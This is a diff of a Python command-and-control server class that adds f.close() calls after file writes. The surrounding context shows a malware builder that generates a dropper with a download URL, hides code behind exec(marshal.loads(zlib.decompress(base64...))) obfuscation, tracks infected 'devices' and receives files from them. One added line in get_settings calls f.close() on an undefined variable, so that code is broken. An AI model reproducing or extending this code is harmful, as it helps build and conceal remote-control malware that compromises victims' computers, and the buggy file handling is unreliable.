@@ -21,6 +21,7 @@ class C2:
         self.total_devices = {}
         with open("clients.json", "r") as f:
             self.total_devices = json.load(f)
+            f.close()
         for device in self.total_devices:
             self.total_devices[device]["status"] = "Offline"
         self.sio.on("mConnect", self.on_connect)
@@ -169,6 +170,7 @@ class C2:
 
         with open("clients.json", "w") as f:
             json.dump(self.total_devices, f)
+            f.close()
 
     def parce_ip(self, ip_range):
         ip_addresses = []
@@ -259,6 +261,7 @@ Pillow==10.4.0
 numpy=="""+requ_numpy+"""
 PyAutoGUI
 opencv-python-headless""")
+            f.close()
 
         payload = f"""url = "{url}"
 file_path = "{payload_file_name}"
@@ -290,6 +293,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         with open(f"{payload_file_name}/{payload_file_name}.py", "w") as f:
             f.writelines(dropper)
+            f.close()
 
         if not os.path.isdir("payloads"):
             os.makedirs("payloads")
@@ -380,11 +384,13 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             "wb",
         ) as f:
             f.write(base64.b64decode(zlib.decompress(data["file"])))
+            f.close()
 
     def get_settings(self):
         try:
             with open("config.json", "r") as file:
                 credentials = json.load(file)
+                f.close()
             return credentials
         except FileNotFoundError:
             return None
